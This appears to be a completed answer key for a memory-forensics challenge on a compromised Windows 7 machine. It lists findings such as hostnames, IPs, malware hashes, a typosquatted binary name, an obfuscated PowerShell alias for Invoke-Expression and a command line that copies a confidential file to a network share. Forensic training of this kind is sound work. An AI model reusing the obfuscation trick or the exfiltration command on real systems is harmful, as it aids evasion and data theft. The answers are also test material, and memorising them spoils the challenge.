**Task 1:** What is the Operating System of the machine?
Windows 7

**Task 2:** When was the memory dump created?
2022-12-19 16:07:30

**Task 3:** After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?
(gv '*MDR*').naMe[3,11,2]-joIN''

**Task 4:** The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?
Invoke-Expression

**Task 5:** A CMD command was executed to attempt to exfiltrate a file. What is the full command line?
type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt

**Task 6:** Following the above command, now tell us if the file was exfiltrated successfully?
NO 

**Task 7:** The attacker tried to create a readme file. What was the full path of the file?
C:\Users\Public\Office\readme.txt

**Task 8:** What was the Host Name of the machine?
USER-PC

**Task 9:** How many user accounts were in the machine?
3

**Task 10:** In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?
`\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

**Task 11:** A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?
b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1

**Task 12:** Following the previous question, what is the Imphash of the malicous file you found above?
Imphash is short for import hash.
d3b592cd9481e4f053b5362e22d61595

**Task 13:** Following the previous question, tell us the date in UTC format when the malicious file was created?
2022-06-22 11:49:04

**Task 14:** What was the local IP address of the machine?
192.168.0.104

**Task 15:** There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?
cmd.exe

**Task 16:** Attacker might have used an email address to login a social media. Can you tell us the email address?
mafia_code1337@gmail.com

**Task 17:** Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?
Wazuh

**Task 18:** The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?
csrsss.exe